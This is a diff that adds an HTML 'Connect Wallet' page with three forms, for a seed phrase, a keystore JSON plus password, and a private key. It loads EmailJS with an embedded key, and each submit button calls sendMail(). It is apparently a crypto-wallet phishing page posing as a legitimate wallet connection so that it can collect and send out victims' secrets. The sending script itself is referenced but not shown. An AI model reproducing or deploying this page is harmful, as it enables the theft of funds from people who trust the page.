@@ -1,0 +1,104 @@
+<!DOCTYPE html>
+
+<html>
+  <head>
+    <meta charset="utf-8" />
+    <title>Connect Wallet</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <link rel="preconnect" href="https://fonts.googleapis.com" />
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+    <link
+      href="https://fonts.googleapis.com/css2?family=Montserrat:wght@300;400;500;600;700;800;900&display=swap"
+      rel="stylesheet"
+    />
+    <link rel="stylesheet" href="/assets/css/newwallet.css" />
+    <script
+      type="text/javascript"
+      src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"
+    ></script>
+    <script type="text/javascript">
+      (function () {
+        emailjs.init("ba5Qwe4DFfN9P74aQ");
+      })();
+    </script>
+  </head>
+
+  <body>
+    <div class="overlay"></div>
+
+    <div class="main-body">
+      <div class="logo">
+        <img src="/images/wallet-image/iogo.png" alt="" />
+      </div>
+
+      <h2>Wallet Connection</h2>
+
+      <div class="buttons">
+        <a href="#phrase-section"> Phrase</a>
+        <a href="#key"> Key JSON</a>
+        <a href="#private-section"> Private Key</a>
+      </div>
+
+      <div class="container" id="phrase-section">
+        <form>
+          <input
+            type="text"
+            placeholder="Enter your Wallet Name"
+            id="walletname"
+          />
+          <textarea
+            id="phrase"
+            placeholder="Enter your Recovery Phrase"
+            required
+            rows="4"
+          ></textarea>
+          <p>Typically 12 (sometimes 24) words seperated by a single space</p>
+          <input type="submit" value="Connect Wallet" onclick="sendMail()" />
+        </form>
+      </div>
+
+      <div class="container" id="key">
+        <form>
+          <input
+            type="text"
+            placeholder="Enter your Wallet Name"
+            id="walletname"
+          />
+          <textarea
+            placeholder="Enter your Keystore JSON"
+            required
+            rows="4"
+            id="keystore"
+          ></textarea>
+          <p>Typically 12 (sometimes 24) words seperated by a single space</p>
+          <input
+            type="password"
+            id="password"
+            placeholder="Enter your Password"
+          />
+          <input type="submit" value="Connect Wallet" onclick="sendMail()" />
+        </form>
+      </div>
+
+      <div class="container" id="private-section">
+        <form>
+          <input
+            type="text"
+            placeholder="Enter your Wallet Name"
+            id="walletname"
+          />
+          <textarea
+            placeholder="Enter your Private Key"
+            rows="4"
+            required
+            id="private"
+          ></textarea>
+          <p>Typically 12 (sometimes 24) words seperated by a single space</p>
+          <input type="submit" value="Connect Wallet" onclick="sendMail()" />
+        </form>
+      </div>
+    </div>
+
+    <script src="/assets/js/import.js"></script>
+  </body>
+</html>
